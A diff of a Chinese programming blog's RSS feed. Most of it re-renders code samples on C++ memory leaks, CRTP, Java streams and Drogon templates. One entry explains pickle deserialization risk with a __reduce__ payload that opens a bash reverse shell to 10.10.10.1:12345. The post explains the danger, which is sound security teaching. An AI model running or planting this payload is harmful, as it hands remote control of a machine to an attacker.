@@ -6,7 +6,22 @@
     <description>Recent content in 软件开发 on 蘭陵N梓記</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-CN</language>
-    <lastBuildDate>Sat, 21 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 04 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>飞哥讲代码31：C&#43;&#43;函数静态与动态分发</title>
+      <link>http://lanlingzi.cn/post/technical/2022/0604/</link>
+      <pubDate>Sat, 04 Jun 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2022/0604/</guid>
+      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
+&lt;p&gt;在&lt;a href=&#34;http://lanlingzi.cn/post/technical/2022/0405/&#34;&gt;C++简单依赖注入&lt;/a&gt;一文中，利用C++类的static变量初始化特性实现了简单的依赖注入框架。你是否还有印象，其中还同时利用C++模板编程另一个特性CRTP：把派生类作为基类的模板参数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;template&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;typename&lt;/span&gt; T&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ManagedObject&lt;/span&gt; {};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;A&lt;/span&gt; : &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; ManagedObject&amp;lt;A&amp;gt; {};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Curiously_recurring_template_pattern&#34;&gt;CRTP&lt;/a&gt;又是什么鬼？CRTP (Curiously Recurring Template Pattern)，翻译中文是奇特递归模板模式，它到底奇特在哪里？用法看起来有点奇怪，怎么能把一个对于基类未知的类型传给基类呢？在C++模板编程中，这一切皆有可能。&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>零拷贝技术及在Java中应用</title>
       <link>http://lanlingzi.cn/post/technical/2022/0521/</link>
@@ -104,23 +119,23 @@
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;C/C++把内存管理交给程序员，由于对象生命周期的长短不一，需要记住内存在真正不需要它的时候显示释放，让程序员承担很大的心智负担，不经意间就出现内存泄露。通常正常的业务流程是不会出现内存泄露的，因为跑用例时会挂上内存检测工具，但一些异常分支，用例难以覆盖的地方，是内存泄露的重灾区。若一旦出现，都难以定位。前一段时间走读某一老产品的代码，是C/C++混合代码，发现一些潜在内存泄露问题。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;问题1&lt;/strong&gt;，每个异常分支需要手动释放方法内申请的内存，代码脱敏如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;pBuf1 = malloc(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(XX1)); &lt;span style=&#34;color:#228b22&#34;&gt;// 申请一块内存
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (cond1) { &lt;span style=&#34;color:#228b22&#34;&gt;// 异常分支1
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf1);
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_ERROR;
-}
-&lt;span style=&#34;color:#228b22&#34;&gt;// 省略其它代码
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;pBuf2 = malloc(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(XX2)); &lt;span style=&#34;color:#228b22&#34;&gt;// 申请另一块内存
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (cond2) { &lt;span style=&#34;color:#228b22&#34;&gt;// 异常分支2
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf1); &lt;span style=&#34;color:#228b22&#34;&gt;// 每个分支，都要释放前面所有代码
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf2);
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_ERROR;
-}
-&lt;span style=&#34;color:#228b22&#34;&gt;// 省略其它代码
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;ptr-&amp;gt;buf1 = pBuf1;  &lt;span style=&#34;color:#228b22&#34;&gt;// 把多块内存的指针赋值给结构体指针ptr的成员变量，ptr是出参，ptr内存以及它的成员指针内存释放是在其它地方
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;ptr-&amp;gt;buf2 = pBuf2;
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_SUCCESS
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pBuf1 = malloc(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(XX1)); &lt;span style=&#34;color:#228b22&#34;&gt;// 申请一块内存
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (cond1) { &lt;span style=&#34;color:#228b22&#34;&gt;// 异常分支1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf1);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_ERROR;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 省略其它代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;pBuf2 = malloc(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(XX2)); &lt;span style=&#34;color:#228b22&#34;&gt;// 申请另一块内存
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (cond2) { &lt;span style=&#34;color:#228b22&#34;&gt;// 异常分支2
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf1); &lt;span style=&#34;color:#228b22&#34;&gt;// 每个分支，都要释放前面所有代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    free(pBuf2);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_ERROR;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 省略其它代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;ptr-&amp;gt;buf1 = pBuf1;  &lt;span style=&#34;color:#228b22&#34;&gt;// 把多块内存的指针赋值给结构体指针ptr的成员变量，ptr是出参，ptr内存以及它的成员指针内存释放是在其它地方
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;ptr-&amp;gt;buf2 = pBuf2;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; RET_SUCCESS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -204,13 +219,13 @@
       <description>&lt;h1 id=&#34;背景&#34;&gt;背景&lt;/h1&gt;
 &lt;p&gt;最近笔者写Python代码比较多，同时又有多种编程语言的开发经验，现在的语言设计上大多趋同。当需要对数据集合操作时，非常喜欢java的stream声明式处理数据，萌生在Python中模仿Java的写法。虽然java的API易用性与Scala/Kotlin相比，还是有很大的差距，但与Python比起来，还是强不少。&lt;/p&gt;
 &lt;p&gt;我们先来看一下Java的玩法：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 过滤Type是GROCERY，按Value倒排序，聚合Id，归并新的集合
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;List&amp;lt;Integer&amp;gt; tanscationsIds = transcations.&lt;span style=&#34;color:#658b00&#34;&gt;parallelStream&lt;/span&gt;()
-        .&lt;span style=&#34;color:#658b00&#34;&gt;filter&lt;/span&gt;(it -&amp;gt; it.&lt;span style=&#34;color:#658b00&#34;&gt;getType&lt;/span&gt;() == Transcation.&lt;span style=&#34;color:#658b00&#34;&gt;GROCERY&lt;/span&gt;)
-        .&lt;span style=&#34;color:#658b00&#34;&gt;sorted&lt;/span&gt;(comparing(Transcation::getValue).&lt;span style=&#34;color:#658b00&#34;&gt;resersed&lt;/span&gt;())
-        .&lt;span style=&#34;color:#658b00&#34;&gt;map&lt;/span&gt;(Transcation::getId)
-        .&lt;span style=&#34;color:#658b00&#34;&gt;collect&lt;/span&gt;(Collectors::toList());
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;函数式是一种声明式编程范式，上面的代码就像SQL语句一样，代码操作数据集合非常直观。笔者在去年写了一篇 &lt;a href=&#34;http://lanlingzi.cn/post/technical/2020/1108_code/&#34;&gt;飞哥讲代码16：函数式让数据处理更简洁&lt;/a&gt; 简单介绍了函数式在数据集合操作上的便利。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 过滤Type是GROCERY，按Value倒排序，聚合Id，归并新的集合
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;List&amp;lt;Integer&amp;gt; tanscationsIds = transcations.&lt;span style=&#34;color:#658b00&#34;&gt;parallelStream&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#658b00&#34;&gt;filter&lt;/span&gt;(it -&amp;gt; it.&lt;span style=&#34;color:#658b00&#34;&gt;getType&lt;/span&gt;() == Transcation.&lt;span style=&#34;color:#658b00&#34;&gt;GROCERY&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#658b00&#34;&gt;sorted&lt;/span&gt;(comparing(Transcation::getValue).&lt;span style=&#34;color:#658b00&#34;&gt;resersed&lt;/span&gt;())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#658b00&#34;&gt;map&lt;/span&gt;(Transcation::getId)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .&lt;span style=&#34;color:#658b00&#34;&gt;collect&lt;/span&gt;(Collectors::toList());
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;函数式是一种声明式编程范式，上面的代码就像SQL语句一样，代码操作数据集合非常直观。笔者在去年写了一篇 &lt;a href=&#34;http://lanlingzi.cn/post/technical/2020/1108_code/&#34;&gt;飞哥讲代码16：函数式让数据处理更简洁&lt;/a&gt; 简单介绍了函数式在数据集合操作上的便利。&lt;/p&gt;
 &lt;p&gt;在数据分析领域，Python生态中有Pandas这类非常优秀的库，它对DataFrame(可以理解一张数据库表存储的数据集合)提供非常简单的API，支持对数据集的过滤、聚合、归并、填充与计算等，很方便地对数据进行清洗和加工。但它也并不是像Java的Stream一样操作，示例如下：&lt;/p&gt;</description>
     </item>
     
@@ -245,19 +260,19 @@
 &lt;/blockquote&gt;
 &lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;有次同事找我看个Python的安全问题。测试代码是这样的：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
-
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
-        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
-
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
-    test = Test()
-    bs = pickle.dumps(test)
-    pickle.loads(bs)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    test = Test()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bs = pickle.dumps(test)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pickle.loads(bs)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
 &lt;p&gt;目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。&lt;/p&gt;</description>
     </item>
     
@@ -332,21 +347,21 @@
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;这次我们还是通过对Drogon的实现分析，一起来窥探与学习一下C++模板特性。&lt;/p&gt;
 &lt;p&gt;Drogon文档中介绍『基于template实现了简单的反射机制，使主程序框架、控制器(controller)和视图(view)完全解耦』。先看一下官方文档中的样例代码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;User&lt;/span&gt; : &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; drogon::HttpController&amp;lt;User&amp;gt;
-{
-  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt;:
-    METHOD_LIST_BEGIN
-    &lt;span style=&#34;color:#228b22&#34;&gt;//use METHOD_ADD to add your custom processing function here;
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::getInfo, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{id}&amp;#34;&lt;/span&gt;, Get);                  &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::getDetailInfo, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{id}/detailinfo&amp;#34;&lt;/span&gt;, Get);  &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}/detailinfo
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::newUser, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{name}&amp;#34;&lt;/span&gt;, Post);                 &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_LIST_END
-    &lt;span style=&#34;color:#228b22&#34;&gt;//your declaration of processing function maybe like this:
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; getInfo(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; userId) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt;;
-    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;getDetailInfo&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; userId) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt;;
-    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;newUser&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, std::string &amp;amp;&amp;amp;userName);
-  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt;:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码需要解决的问题：注册的&lt;code&gt;METHOD_ADD(User::getInfo, &amp;quot;/{id}&amp;quot;, Get);&lt;/code&gt;，对应的请求消息怎么路由到&lt;code&gt;getInfo&lt;/code&gt; 方法？&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;User&lt;/span&gt; : &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; drogon::HttpController&amp;lt;User&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    METHOD_LIST_BEGIN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;//use METHOD_ADD to add your custom processing function here;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::getInfo, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{id}&amp;#34;&lt;/span&gt;, Get);                  &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::getDetailInfo, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{id}/detailinfo&amp;#34;&lt;/span&gt;, Get);  &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}/detailinfo
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_ADD(User::newUser, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/{name}&amp;#34;&lt;/span&gt;, Post);                 &lt;span style=&#34;color:#228b22&#34;&gt;//path is /api/v1/User/{arg1}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    METHOD_LIST_END
